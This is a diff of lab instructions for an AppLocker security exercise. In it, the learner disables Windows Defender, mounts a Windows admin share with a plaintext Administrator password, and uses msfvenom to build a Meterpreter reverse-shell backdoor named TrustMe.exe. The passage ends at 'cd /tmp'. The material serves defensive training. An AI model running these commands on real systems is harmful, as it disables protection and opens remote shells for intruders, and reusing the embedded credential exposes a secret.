@@ -6,25 +6,27 @@ Applocker Instructions:
 
 Let’s see what happens when we do not have AppLocker running.  We will set up a simple backdoor and have it connect back to the Ubuntu system.  Remember, the goal is not to show how we can bypass EDR and Endpoint products.  It is to create a simple backdoor and have it connect back.
 
-First, let’s disable Defender. Simply run the following from an Administrator PowerShell prompt:
+Before we begin, we need to disable Defender. Start by opening an instance of Windows Powershell. Do this by clicking on the Powershell icon in the taskbar.
 
-`Set-MpPreference -DisableRealtimeMonitoring $true`
+![](attachments/OpeningPowershell.png)
+
+Next, run the following command in the Powershell terminal:
+
+<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
+
+![](attachments/applocker_disabledefender.png)
 
 This will disable Defender for this session.
 
 If you get angry red errors, that is Ok, it means Defender is not running.
 
-Thankfully, we have a couple of scripts that greatly simplify this process.  Please make sure both your Windows and your Linux systems are running.
+Let’s get started by opening a Kali instance.
 
-Let’s get started by opening a Terminal as Administrator
+![](attachments/OpeningKaliInstance.png)
 
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
+Alternatively, you can click on the Kali icon in the taskbar.
 
-When you get the User Account Control Prompt, select Yes.
-
-And, open a Ubuntu command prompt:
-
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
+![](attachments/TaskbarKaliIcon.png)
 
 ####NOTE##### 
 
@@ -52,29 +54,30 @@ For PowerShell and Command Prompt, please right click on them and select Run As 
 
 ###END NOTE###
 
-On your Linux system, please run the following command:
+Let's start by getting root access in our terminal.
 
-$`ifconfig`
+<pre>sudo su -</pre>
 
-![](attachments/Clipboard_2020-06-12-12-35-15.png)
+Next, lets run the following command to get our IP address:
 
-Please note the IP address of your Ethernet adapter.  
+<pre>ifconfig</pre>
 
+Please note the IP address of your Ethernet adapter.
 
+![](attachments/applocker_ifconfig.png)
 
-Please note that my adaptor is called eth0 and my IP address is 172.26.19.133.   Your IP Address and adapter name may be different.
+Please note that my adapter is called `eth0` and my IP address is `10.10.1.117` Your IP Address and adapter name may be different.
 
-Please note your IP address for the ADHD Linux system on a piece of paper:
+Remember this IP by writing it down, etc.
 
+First, we need to run the following command in order to mount our remote system to the correct directory:
 
+<pre>mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh</pre>
 
 Now, run the following commands to start a simple backdoor and backdoor listener: 
 
-$ `sudo su -`
-Please note, the adhd password is adhd.
-
-`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
--f exe -o /tmp/TrustMe.exe`
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
+-f exe -o /tmp/TrustMe.exe</pre>
 
 `cd /tmp`
 
